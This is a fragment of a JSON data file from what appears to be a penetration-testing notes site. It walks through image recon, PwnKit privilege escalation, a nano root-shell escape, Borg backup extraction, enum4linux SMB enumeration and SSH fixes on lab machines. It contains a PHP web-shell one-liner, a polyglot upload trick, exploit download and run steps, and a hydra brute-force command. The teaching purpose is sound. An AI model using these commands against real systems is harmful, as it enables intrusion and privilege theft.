+        "language": "bash",
+        "code": "md5sum image.jpg\nsha256sum image.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-hash-output",
+        "language": "text",
+        "code": "c0ffeec0ffeec0ffee image.jpg"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-reverse-search",
+        "text": "Reverse Image Search"
+      },
+      {
+        "type": "order_block",
+        "id": "image-reverse-search-text",
+        "text": "Reverse image search can reveal where the image appears on the internet and may expose staging servers or development environments."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-source-code",
+        "text": "Find Image Paths in Source Code"
+      },
+      {
+        "type": "code_block",
+        "id": "image-source-code-block",
+        "language": "html",
+        "code": "<img src=\"/uploads/private/admin.png\">"
+      },
+      {
+        "type": "output_block",
+        "id": "image-source-output",
+        "language": "text",
+        "code": "Possible hidden directory: /uploads/private/"
+      },
+      {
+        "type": "section_heading",
+        "id": "image-upload-testing",
+        "text": "Testing Image Upload Vulnerabilities"
+      },
+      {
+        "type": "code_block",
+        "id": "image-upload-code",
+        "language": "php",
+        "code": "<?php system($_GET['cmd']); ?>"
+      },
+      {
+        "type": "order_block",
+        "id": "image-upload-analysis",
+        "text": "Sometimes attackers upload images containing embedded web shells if the server does not properly validate file types."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-polyglot",
+        "text": "Image Polyglot Technique"
+      },
+      {
+        "type": "code_block",
+        "id": "image-polyglot-code",
+        "language": "bash",
+        "code": "cat shell.php > shell.jpg"
+      },
+      {
+        "type": "output_block",
+        "id": "image-polyglot-output",
+        "language": "text",
+        "code": "Creates a file that appears as an image but contains executable code."
+      },
+      {
+        "type": "section_heading",
+        "id": "image-summary",
+        "text": "Important Image Recon Commands"
+      },
+      {
+        "type": "code_block",
+        "id": "image-summary-code",
+        "language": "bash",
+        "code": "exiftool image.jpg\nstrings image.jpg\nbinwalk image.jpg\nsteghide info image.jpg"
+      },
+      {
+        "type": "order_block",
+        "id": "image-summary-text",
+        "text": "These commands quickly identify metadata, hidden text, embedded files, and steganography inside images."
+      }
+    ]
+  },
+  {
+    "id": 15,
+    "slug": "privESC-nano",
+    "title": "PRIVESC Nano - PwnKit",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/privESC/PwnKit-nano.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "pwnkit-intro",
+        "text": "PwnKit Privilege Escalation (CVE-2021-4034)"
+      },
+      {
+        "type": "order_block",
+        "id": "pwnkit-definition",
+        "text": "PwnKit is a local privilege escalation vulnerability in <highlight>polkit's pkexec</highlight>. If the binary is vulnerable, a low‑privileged user can exploit it to execute commands as <highlight>root</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-shell",
+        "text": "Initial Foothold"
+      },
+      {
+        "type": "output_block",
+        "id": "initial-shell-output",
+        "language": "bash",
+        "code": "www-data@ip-10-113-173-52:/dev/shm$"
+      },
+      {
+        "type": "order_block",
+        "id": "initial-shell-explain",
+        "text": "The system was compromised and a low‑privilege shell was obtained as the <highlight>www-data</highlight> user."
+      },
+      {
+        "type": "section_heading",
+        "id": "check-pkexec",
+        "text": "Checking pkexec Version"
+      },
+      {
+        "type": "code_block",
+        "id": "pkexec-version-command",
+        "language": "bash",
+        "code": "pkexec --version"
+      },
+      {
+        "type": "output_block",
+        "id": "pkexec-version-output",
+        "language": "bash",
+        "code": "pkexec version 0.105"
+      },
+      {
+        "type": "order_block",
+        "id": "pkexec-version-analysis",
+        "text": "The system is running a version of pkexec that may be vulnerable to <highlight>PwnKit</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "check-suid",
+        "text": "Checking if pkexec is SUID"
+      },
+      {
+        "type": "code_block",
+        "id": "pkexec-suid-command",
+        "language": "bash",
+        "code": "ls -l /usr/bin/pkexec"
+      },
+      {
+        "type": "output_block",
+        "id": "pkexec-suid-output",
+        "language": "bash",
+        "code": "-rwsr-xr-x 1 root root 31032 Feb 21 2022 /usr/bin/pkexec"
+      },
+      {
+        "type": "order_block",
+        "id": "pkexec-suid-analysis",
+        "text": "The <highlight>s</highlight> flag confirms that the binary is running with <highlight>SUID root privileges</highlight>, meaning it executes as root even when run by normal users."
+      },
+      {
+        "type": "section_heading",
+        "id": "exploit-upload",
+        "text": "Uploading PwnKit Exploit"
+      },
+      {
+        "type": "output_block",
+        "id": "exploit-upload-output",
+        "language": "bash",
+        "code": "www-data@ip-10-113-173-52:/dev/shm$ ls\n'GCONV_PATH=.'   PwnKit"
+      },
+      {
+        "type": "order_block",
+        "id": "exploit-upload-analysis",
+        "text": "The PwnKit exploit was uploaded to the writable directory <highlight>/dev/shm</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "running-exploit",
+        "text": "Running the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "run-exploit-command",
+        "language": "bash",
+        "code": "./PwnKit"
+      },
+      {
+        "type": "output_block",
+        "id": "run-exploit-output",
+        "language": "bash",
+        "code": "Failed to copy file: File exists"
+      },
+      {
+        "type": "order_block",
+        "id": "run-exploit-analysis",
+        "text": "The exploit attempted to trigger the vulnerability by abusing the GCONV_PATH environment variable used by pkexec."
+      },
+      {
+        "type": "section_heading",
+        "id": "backup-discovery",
+        "text": "Discovering Backup Files"
+      },
+      {
+        "type": "code_block",
+        "id": "backup-navigation",
+        "language": "bash",
+        "code": "cd /var/backups/mike_home_backup\nls -la"
+      },
+      {
+        "type": "order_block",
+        "id": "backup-analysis",
+        "text": "A backup of the user <highlight>mike</highlight>'s home directory was discovered inside the system backups."
+      },
+      {
+        "type": "section_heading",
+        "id": "bash-history",
+        "text": "Reading User Bash History"
+      },
+      {
+        "type": "code_block",
+        "id": "bash-history-command",
+        "language": "bash",
+        "code": "cat .bash_history"
+      },
+      {
+        "type": "output_block",
+        "id": "bash-history-output",
+        "language": "bash",
+        "code": "cd ~\nls\nping 1.1.1.1\ncat /home/mike/user.txt\ncd /var/www/\nls\ncd html\nls -al\ncat index.html\nsudo -lb3stpassw0rdbr0xx\nclear\nsudo -l\nexit"
+      },
+      {
+        "type": "order_block",
+        "id": "bash-history-analysis",
+        "text": "The bash history revealed that the user <highlight>mike</highlight> executed sudo commands and exposed a password in the command line."
+      },
+      {
+        "type": "section_heading",
+        "id": "rootkit-script",
+        "text": "Finding a Root-Owned Script"
+      },
+      {
+        "type": "code_block",
+        "id": "rootkit-script-command",
+        "language": "bash",
+        "code": "cat /opt/rootkit.sh"
+      },
+      {
+        "type": "code_block",
+        "id": "rootkit-script-content",
+        "language": "bash",
+        "code": "#!/bin/bash\n\nread -e -p \"Would you like to versioncheck, update, list or read the report ? \" ans;\n\ncase $ans in\nversioncheck)\n/usr/bin/rkhunter --versioncheck ;;\nupdate)\n/usr/bin/rkhunter --update;;\nlist)\n/usr/bin/rkhunter --list;;\nread)\n/bin/nano /root/report.txt;;\n*)\nexit;;\nesac"
+      },
+      {
+        "type": "order_block",
+        "id": "rootkit-script-analysis",
+        "text": "The script allows reading the file <highlight>/root/report.txt</highlight> using the nano editor."
+      },
+      {
+        "type": "section_heading",
+        "id": "nano-root-file",
+        "text": "Opening Root File With Nano"
+      },
+      {
+        "type": "code_block",
+        "id": "nano-command",
+        "language": "bash",
+        "code": "/bin/nano /root/report.txt"
+      },
+      {
+        "type": "order_block",
+        "id": "nano-analysis",
+        "text": "Because the script runs with elevated privileges, opening the file through nano allows interacting with a root-owned file."
+      },
+      {
+        "type": "section_heading",
+        "id": "nano-shell",
+        "text": "Escaping Nano to Get a Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "nano-shell-command",
+        "language": "bash",
+        "code": "Ctrl+R\nCtrl+X\nreset; bash 1>&0 2>&0"
+      },
+      {
+        "type": "order_block",
+        "id": "nano-shell-analysis",
+        "text": "Nano allows command execution features that can be abused to spawn a shell when opened with elevated privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "root-shell",
+        "text": "Root Access Obtained"
+      },
+      {
+        "type": "output_block",
+        "id": "root-shell-output",
+        "language": "bash",
+        "code": "root@ip-10-113-173-52:~#"
+      },
+      {
+        "type": "section_heading",
+        "id": "pwnkit-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "pwnkit-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Obtained initial shell as www-data",
+          "Checked pkexec version and SUID permissions",
+          "Uploaded PwnKit exploit to /dev/shm",
+          "Attempted privilege escalation using pkexec vulnerability",
+          "Enumerated backup files inside /var/backups",
+          "Discovered bash history of user mike",
+          "Found root-owned rootkit script",
+          "Abused script option to open root file using nano",
+          "Escaped nano to spawn a root shell"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 15,
+    "slug": "borg",
+    "title": "Borg",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/borg.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "borg-intro",
+        "text": "Borg Backup Extraction"
+      },
+      {
+        "type": "order_block",
+        "id": "borg-definition",
+        "text": "<highlight>BorgBackup (borg)</highlight> is a deduplicating backup tool used to create compressed and encrypted backups. System administrators commonly use it to store snapshots of directories. If an attacker finds a borg archive and its passphrase, they can extract sensitive files from the backup."
+      },
+      {
+        "type": "section_heading",
+        "id": "discovering-borg-archive",
+        "text": "Discovering the Borg Archive"
+      },
+      {
+        "type": "code_block",
+        "id": "navigate-archive",
+        "language": "bash",
+        "code": "cd /home/field/dev\nls"
+      },
+      {
+        "type": "output_block",
+        "id": "archive-files",
+        "language": "bash",
+        "code": "final_archive"
+      },
+      {
+        "type": "order_block",
+        "id": "archive-analysis",
+        "text": "A borg repository named <highlight>final_archive</highlight> was discovered in the developer directory. This indicates that backups were created using Borg."
+      },
+      {
+        "type": "section_heading",
+        "id": "listing-backup-content",
+        "text": "Listing Backup Snapshots"
+      },
+      {
+        "type": "code_block",
+        "id": "borg-list-command",
+        "language": "bash",
+        "code": "borg list final_archive"
+      },
+      {
+        "type": "output_block",
+        "id": "borg-list-output",
+        "language": "bash",
+        "code": "music_archive Tue, 2020-12-29 19:00:38"
+      },
+      {
+        "type": "order_block",
+        "id": "borg-list-analysis",
+        "text": "The borg repository contains a snapshot named <highlight>music_archive</highlight>. Snapshots are backups of directories taken at specific times."
+      },
+      {
+        "type": "section_heading",
+        "id": "extracting-backup",
+        "text": "Extracting the Backup"
+      },
+      {
+        "type": "code_block",
+        "id": "borg-extract-command",
+        "language": "bash",
+        "code": "borg extract final_archive::music_archive"
+      },
+      {
+        "type": "order_block",
+        "id": "borg-extract-analysis",
+        "text": "Using <highlight>borg extract</highlight>, the contents of the backup snapshot were restored into the current directory."
+      },
+      {
+        "type": "section_heading",
+        "id": "checking-extracted-files",
+        "text": "Viewing Extracted Files"
+      },
+      {
+        "type": "code_block",
+        "id": "list-extracted-files",
+        "language": "bash",
+        "code": "ls -la"
+      },
+      {
+        "type": "order_block",
+        "id": "files-analysis",
+        "text": "After extraction, files from the backup were restored. These files may contain credentials, configuration files, or sensitive data useful for privilege escalation."
+      },
+      {
+        "type": "section_heading",
+        "id": "why-borg-is-dangerous",
+        "text": "Why Borg Backups Are Valuable for Attackers"
+      },
+      {
+        "type": "explanation",
+        "id": "borg-importance",
+        "title": "Security Impact",
+        "items": [
+          "Backup archives often contain full copies of user directories.",
+          "They may include SSH keys, passwords, configuration files, or source code.",
+          "If attackers obtain the borg passphrase, they can restore the entire backup.",
+          "Developers frequently store backups in insecure directories."
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "borg-summary",
+        "text": "Summary of Borg Backup Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "borg-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Discovered a borg repository in the developer directory",
+          "Listed available backup snapshots using borg list",
+          "Found the snapshot named music_archive",
+          "Extracted the backup using borg extract",
+          "Recovered files from the backup for further enumeration"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 16,
+    "slug": "enum4linux",
+    "title": "Enum4linux",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/tools/enum4Linux.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "enum4linux-intro",
+        "text": "Enum4linux SMB Enumeration Tool"
+      },
+      {
+        "type": "order_block",
+        "id": "enum4linux-definition",
+        "text": "<highlight>enum4linux</highlight> is a Linux enumeration tool used to extract information from systems running <highlight>SMB / NetBIOS services</highlight> such as Windows machines or Linux systems using <highlight>Samba</highlight>. It automates multiple enumeration techniques to discover usernames, shares, groups, password policies, and system details."
+      },
+      {
+        "type": "section_heading",
+        "id": "when-enum4linux-works",
+        "text": "When Enum4linux Works"
+      },
+      {
+        "type": "order_block",
+        "id": "enum4linux-requirements",
+        "text": "Enum4linux works when the target system exposes <highlight>SMB services</highlight> on ports <highlight>139</highlight> or <highlight>445</highlight>. If SMB is not accessible, the tool cannot retrieve information from the target."
+      },
+      {
+        "type": "code_block",
+        "id": "check-smb-ports",
+        "language": "bash",
+        "code": "nmap -p 139,445 10.112.178.21"
+      },
+      {
+        "type": "order_block",
+        "id": "check-smb-analysis",
+        "text": "Before using enum4linux, verify that SMB services are running on the target. Without these ports open, SMB enumeration will fail."
+      },
+      {
+        "type": "section_heading",
+        "id": "enum4linux-basic-usage",
+        "text": "Basic Enum4linux Command"
+      },
+      {
+        "type": "code_block",
+        "id": "enum4linux-command",
+        "language": "bash",
+        "code": "enum4linux -a 10.112.178.21"
+      },
+      {
+        "type": "order_block",
+        "id": "enum4linux-command-analysis",
+        "text": "The <highlight>-a</highlight> flag runs all enumeration modules including share discovery, user enumeration, password policy extraction, and NetBIOS information gathering."
+      },
+      {
+        "type": "section_heading",
+        "id": "target-information",
+        "text": "Target Information"
+      },
+      {
+        "type": "output_block",
+        "id": "target-info-output",
+        "language": "bash",
+        "code": "Target ........... 10.112.178.21\nRID Range ........ 500-550,1000-1050"
+      },
+      {
+        "type": "order_block",
+        "id": "target-info-analysis",
+        "text": "Enum4linux identifies the target IP and defines a <highlight>RID range</highlight> which will later be used to enumerate users through <highlight>RID cycling</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "domain-workgroup",
+        "text": "Enumerating Domain or Workgroup"
+      },
+      {
+        "type": "output_block",
+        "id": "domain-output",
+        "language": "bash",
+        "code": "[+] Got domain/workgroup name: WORKGROUP"
+      },
+      {
+        "type": "order_block",
+        "id": "domain-analysis",
+        "text": "The target system belongs to a <highlight>WORKGROUP</highlight> rather than a centralized Windows domain. This indicates a standalone system rather than an enterprise Active Directory environment."
+      },
+      {
+        "type": "section_heading",
+        "id": "netbios-enumeration",
+        "text": "NetBIOS Enumeration"
+      },
+      {
+        "type": "output_block",
+        "id": "netbios-output",
+        "language": "bash",
+        "code": "BASIC2 <00> Workstation Service\nBASIC2 <20> File Server Service\nWORKGROUP <00> Domain/Workgroup Name"
+      },
+      {
+        "type": "order_block",
+        "id": "netbios-analysis",
+        "text": "NetBIOS enumeration reveals the <highlight>hostname</highlight> and confirms that the system is running SMB file services."
+      },
+      {
+        "type": "section_heading",
+        "id": "null-session-check",
+        "text": "Null Session Authentication"
+      },
+      {
+        "type": "output_block",
+        "id": "null-session-output",
+        "language": "bash",
+        "code": "[+] Server 10.112.178.21 allows sessions using username '', password ''"
+      },
+      {
+        "type": "order_block",
+        "id": "null-session-analysis",
+        "text": "The server allows <highlight>null sessions</highlight>, meaning an attacker can interact with SMB services without authentication. This is a common misconfiguration that exposes sensitive information."
+      },
+      {
+        "type": "section_heading",
+        "id": "os-information",
+        "text": "Operating System Discovery"
+      },
+      {
+        "type": "output_block",
+        "id": "os-output",
+        "language": "bash",
+        "code": "Samba Server 4.15.13-Ubuntu"
+      },
+      {
+        "type": "order_block",
+        "id": "os-analysis",
+        "text": "Enum4linux reveals that the machine is running <highlight>Samba on Ubuntu</highlight>, meaning it is a Linux system providing SMB services."
+      },
+      {
+        "type": "section_heading",
+        "id": "share-enumeration",
+        "text": "SMB Share Enumeration"
+      },
+      {
+        "type": "output_block",
+        "id": "share-output",
+        "language": "bash",
+        "code": "Sharename       Type\nAnonymous       Disk\nIPC$            IPC"
+      },
+      {
+        "type": "order_block",
+        "id": "share-analysis",
+        "text": "Enum4linux discovered a share named <highlight>Anonymous</highlight>. Because null sessions are allowed, this share can likely be accessed without credentials."
+      },
+      {
+        "type": "section_heading",
+        "id": "share-access",
+        "text": "Accessing the Anonymous Share"
+      },
+      {
+        "type": "code_block",
+        "id": "smbclient-command",
+        "language": "bash",
+        "code": "smbclient //10.112.178.21/Anonymous -N"
+      },
+      {
+        "type": "order_block",
+        "id": "share-access-analysis",
+        "text": "Using <highlight>smbclient</highlight> allows connecting to the discovered share. The <highlight>-N</highlight> flag specifies no password for anonymous access."
+      },
+      {
+        "type": "section_heading",
+        "id": "password-policy",
+        "text": "Password Policy Enumeration"
+      },
+      {
+        "type": "output_block",
+        "id": "password-policy-output",
+        "language": "bash",
+        "code": "Minimum password length: 5\nPassword Complexity: Disabled"
+      },
+      {
+        "type": "order_block",
+        "id": "password-policy-analysis",
+        "text": "The password policy is weak. A minimum length of <highlight>5 characters</highlight> and disabled complexity indicates that weak passwords may exist."
+      },
+      {
+        "type": "section_heading",
+        "id": "rid-cycling",
+        "text": "User Enumeration via RID Cycling"
+      },
+      {
+        "type": "output_block",
+        "id": "rid-users-output",
+        "language": "bash",
+        "code": "Unix User\\kay\nUnix User\\jan\nUnix User\\ubuntu"
+      },
+      {
+        "type": "order_block",
+        "id": "rid-users-analysis",
+        "text": "Enum4linux performed <highlight>RID cycling</highlight> to discover local system users. These usernames can be used in further attacks such as SSH login attempts or password brute forcing."
+      },
+      {
+        "type": "section_heading",
+        "id": "next-attack-path",
+        "text": "Using Discovered Users for Attacks"
+      },
+      {
+        "type": "code_block",
+        "id": "ssh-bruteforce-command",
+        "language": "bash",
+        "code": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.112.178.21"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-bruteforce-analysis",
+        "text": "The discovered usernames can be used to attempt <highlight>SSH password brute force attacks</highlight> if the SSH service is running on the target."
+      },
+      {
+        "type": "section_heading",
+        "id": "enum4linux-summary",
+        "text": "Summary of Enumeration"
+      },
+      {
+        "type": "explanation",
+        "id": "enum4linux-steps",
+        "title": "Information Gathered Using Enum4linux",
+        "items": [
+          "Confirmed SMB service availability",
+          "Discovered workgroup name",
+          "Enumerated NetBIOS hostname",
+          "Confirmed null session access",
+          "Identified Samba running on Ubuntu",
+          "Enumerated accessible SMB shares",
+          "Extracted password policy configuration",
+          "Discovered system users through RID cycling",
+          "Identified possible attack paths such as SMB share access or SSH brute forcing"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 17,
+    "slug": "pkexec-binary",
+    "title": "PKEXEC Exploitation",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Binaries-Exploitation/pkexec.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "courseMaterials": [
+      {
+        "title": "CVE-2021-4034 - POLKIT",
+        "url": "https://github.com/berdav/CVE-2021-4034#"
+      }
+    ],
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "pwnkit-intro",
+        "text": "PwnKit Privilege Escalation (CVE-2021-4034)"
+      },
+      {
+        "type": "order_block",
+        "id": "pwnkit-definition",
+        "text": "PwnKit is a local privilege escalation vulnerability affecting <highlight>pkexec</highlight>, a component of the polkit framework. If the binary is vulnerable, a low‑privileged user can exploit it to execute commands as <highlight>root</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "glibc-reference",
+        "text": "Quick glibc Reference for Ubuntu Versions"
+      },
+      {
+        "type": "code_block",
+        "id": "glibc-reference-table",
+        "language": "text",
+        "code": "Quick Reference\n\nUbuntu Version    glibc Version\n--------------------------------\nUbuntu 18.04   ->  glibc 2.27\nUbuntu 20.04   ->  glibc 2.31\nUbuntu 22.04   ->  glibc 2.35\nUbuntu 24.04   ->  glibc 2.39\n\nCompatibility Tip:\nExploit builds targeting glibc <= 2.27 usually work reliably on Ubuntu 18.04 systems."
+      },
+      {
+        "type": "section_heading",
+        "id": "download-ubuntu",
+        "text": "Preparing Ubuntu Environment Using Docker"
+      },
+      {
+        "type": "order_block",
+        "id": "ubuntu-download-explain",
+        "text": "A temporary Ubuntu environment was created using Docker to compile the exploit in a Linux environment compatible with the target system."
+      },
+      {
+        "type": "code_block",
+        "id": "docker-run-command",
+        "language": "bash",
+        "code": "docker run -it ubuntu:20.04 bash"
+      },
+      {
+        "type": "code_block",
+        "id": "docker-exec-command",
+        "language": "bash",
+        "code": "docker exec -it <container_name> bash"
+      },
+      {
+        "type": "order_block",
+        "id": "docker-analysis",
+        "text": "Docker was used to launch an Ubuntu container, providing an isolated environment for compiling the exploit."
+      },
+      {
+        "type": "section_heading",
+        "id": "environment-setup",
+        "text": "Installing Required Tools"
+      },
+      {
+        "type": "code_block",
+        "id": "install-tools-command",
+        "language": "bash",
+        "code": "apt update\napt install git build-essential -y"
+      },
+      {
+        "type": "order_block",
+        "id": "install-tools-analysis",
+        "text": "Required development tools were installed. The build-essential package provides the gcc compiler and make utility needed to compile exploit code."
+      },
+      {
+        "type": "section_heading",
+        "id": "clone-exploit",
+        "text": "Downloading the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "clone-command",
+        "language": "bash",
+        "code": "git clone https://github.com/berdav/CVE-2021-4034.git"
+      },
+      {
+        "type": "order_block",
+        "id": "clone-analysis",
+        "text": "The exploit repository containing the PwnKit exploit code was cloned from GitHub."
+      },
+      {
+        "type": "section_heading",
+        "id": "compile-exploit",
+        "text": "Compiling the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "compile-command",
+        "language": "bash",
+        "code": "cd CVE-2021-4034\nmake"
+      },
+      {
+        "type": "order_block",
+        "id": "compile-analysis",
+        "text": "The exploit source code was compiled successfully, producing the exploit binary and payload files."
+      },
+      {
+        "type": "section_heading",
+        "id": "compress-exploit",
+        "text": "Compressing Exploit for Transfer"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-command",
+        "language": "bash",
+        "code": "tar -cvf CVE-2021-4034.tar CVE-2021-4034"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-analysis",
+        "text": "The exploit directory was compressed into a tar archive to simplify transferring the files to the target system."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Initial Access to Target System"
+      },
+      {
+        "type": "output_block",
+        "id": "ssh-login-output",
+        "language": "bash",
+        "code": "ssh -i id_rsa john@10.114.181.240\nWelcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)"
+      },
+      {
+        "type": "order_block",
+        "id": "initial-access-analysis",
+        "text": "Access to the target machine was obtained via SSH using the user john, providing a low‑privileged shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "check-pkexec-version",
+        "text": "Checking pkexec Version"
+      },
+      {
+        "type": "code_block",
+        "id": "pkexec-version-command",
+        "language": "bash",
+        "code": "pkexec --version"
+      },
+      {
+        "type": "output_block",
+        "id": "pkexec-version-output",
+        "language": "bash",
+        "code": "pkexec version 0.105"
+      },
+      {
+        "type": "order_block",
+        "id": "pkexec-version-analysis",
+        "text": "The pkexec binary version 0.105 is vulnerable to the PwnKit privilege escalation vulnerability."
+      },
+      {
+        "type": "section_heading",
+        "id": "check-glibc",
+        "text": "Checking glibc Version"
+      },
+      {
+        "type": "code_block",
+        "id": "glibc-command",
+        "language": "bash",
+        "code": "ldd --version"
+      },
+      {
+        "type": "output_block",
+        "id": "glibc-output",
+        "language": "bash",
+        "code": "ldd (Ubuntu GLIBC 2.27-3ubuntu1)"
+      },
+      {
+        "type": "order_block",
+        "id": "glibc-analysis",
+        "text": "The target system runs glibc version 2.27. Confirming this ensures compatibility with the compiled exploit."
+      },
+      {
+        "type": "section_heading",
+        "id": "upload-exploit",
+        "text": "Uploading Exploit to Target"
+      },
+      {
+        "type": "output_block",
+        "id": "exploit-directory-output",
+        "language": "bash",
+        "code": "john@exploitable:/var/tmp$ ls\nCVE-2021-4034\nCVE-2021-4034.tar"
+      },
+      {
+        "type": "order_block",
+        "id": "upload-analysis",
+        "text": "The exploit archive was transferred to the writable directory /var/tmp on the target system."
+      },
+      {
+        "type": "section_heading",
+        "id": "running-exploit",
+        "text": "Executing the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "run-command",
+        "language": "bash",
+        "code": "./cve-2021-4034"
+      },
+      {
+        "type": "output_block",
+        "id": "root-shell-output",
+        "language": "bash",
+        "code": "# whoami\nroot"
+      },
+      {
+        "type": "order_block",
+        "id": "exploit-analysis",
+        "text": "The exploit abuses environment variable handling in pkexec to load a malicious gconv module, resulting in execution of attacker-controlled code as root."
+      },
+      {
+        "type": "section_heading",
+        "id": "root-proof",
+        "text": "Reading Root Flag"
+      },
+      {
+        "type": "code_block",
+        "id": "root-flag-command",
+        "language": "bash",
+        "code": "cd /root\ncat root.txt"
+      },
+      {
+        "type": "output_block",
+        "id": "root-flag-output",
+        "language": "bash",
+        "code": "2e337b8c9f3aff0c2b3e8d4e6a7c88fc"
+      },
+      {
+        "type": "section_heading",
+        "id": "pwnkit-summary",
+        "text": "Summary of Attack Path"
+      },
+      {
+        "type": "explanation",
+        "id": "pwnkit-steps",
+        "title": "Steps Performed",
+        "items": [
+          "Created Ubuntu container using Docker",
+          "Installed development tools (git, gcc, make)",
+          "Downloaded PwnKit exploit from GitHub",
+          "Compiled exploit using make",
+          "Compressed exploit directory using tar",
+          "Connected to target machine via SSH as user john",
+          "Checked pkexec version and confirmed vulnerability",
+          "Verified glibc version for compatibility",
+          "Uploaded exploit to /var/tmp directory",
+          "Executed exploit to escalate privileges",
+          "Obtained root shell and retrieved root flag"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 17,
+    "slug": "ssh-probing-issue",
+    "title": "SSH Probing issue",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Connection-Issues/ssh-probing-issues.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ssh-issue-intro",
+        "text": "SSH Connection Issues (Probes / Hanging / Slow Login)"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-definition",
+        "text": "SSH connection problems may occur when connecting to remote systems using SSH. Common symptoms include connection hanging, delayed login, or warnings related to cryptographic algorithms."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-warning",
+        "text": "Example SSH Warning"
+      },
+      {
+        "type": "output_block",
+        "id": "ssh-warning-output",
+        "language": "bash",
+        "code": "** WARNING: connection is not using a post-quantum key exchange algorithm.\n** This session may be vulnerable to \"store now, decrypt later\" attacks."
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-warning-analysis",
+        "text": "This warning appears when the SSH server does not support modern post‑quantum key exchange algorithms. The connection still works but the encryption may not be future‑proof."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-hanging",
+        "text": "Issue: SSH Connection Hanging"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-hanging-explain",
+        "text": "Sometimes SSH connections freeze or take a long time before showing the password prompt or shell. This often happens due to DNS resolution problems, network delays, firewall filtering, or incompatible SSH settings."
+      },
+      {
+        "type": "section_heading",
+        "id": "debug-ssh",
+        "text": "Debugging SSH Connection"
+      },
+      {
+        "type": "code_block",
+        "id": "ssh-debug-command",
+        "language": "bash",
+        "code": "ssh -vvv user@target_ip"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-debug-analysis",
+        "text": "The -vvv option enables verbose debugging output which helps identify where the SSH connection is failing or slowing down."
+      },
+      {
+        "type": "section_heading",
+        "id": "dns-fix",
+        "text": "Fix: Disable DNS Lookup"
+      },
+      {
+        "type": "code_block",
+        "id": "dns-fix-command",
+        "language": "bash",
+        "code": "ssh -o \"UseDNS=no\" user@target_ip"
+      },
+      {
+        "type": "order_block",
+        "id": "dns-fix-analysis",
+        "text": "Disabling DNS lookup can resolve slow SSH logins when the server attempts reverse DNS resolution."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-key-permission",
+        "text": "Fix: Correct SSH Key Permissions"
+      },
+      {
+        "type": "code_block",
+        "id": "ssh-key-permission-command",
+        "language": "bash",
+        "code": "chmod 600 id_rsa"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-key-permission-analysis",
+        "text": "SSH requires private keys to have strict permissions. Incorrect permissions may prevent authentication."
+      },
+      {
+        "type": "section-heading",
+        "id": "ssh-network-check",
+        "text": "Check Network Connectivity"
+      },
+      {
+        "type": "code_block",
+        "id": "ping-command",
+        "language": "bash",
+        "code": "ping target_ip"
+      },
+      {
+        "type": "code_block",
+        "id": "port-check-command",
+        "language": "bash",
+        "code": "nc -zv target_ip 22"
+      },
+      {
+        "type": "order_block",
+        "id": "network-analysis",
+        "text": "Checking network connectivity confirms that the SSH service is reachable and that port 22 is open."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-timeout-fix",
+        "text": "Fix: Increase SSH Timeout"
+      },
+      {
+        "type": "code_block",
+        "id": "timeout-command",
+        "language": "bash",
+        "code": "ssh -o ConnectTimeout=10 user@target_ip"
+      },
+      {
+        "type": "order_block",
+        "id": "timeout-analysis",
+        "text": "Increasing the connection timeout may help when connecting to slow or unstable systems."
+      },
+      {
+        "type": "section_heading",
+        "id": "tmux-intro",
+        "text": "Using tmux with SSH"
+      },
+      {
+        "type": "order_block",
+        "id": "tmux-definition",
+        "text": "tmux is a terminal multiplexer that allows multiple terminal sessions to run inside a single window. It is commonly used in penetration testing to maintain persistent shells and split terminal windows."
+      },
+      {
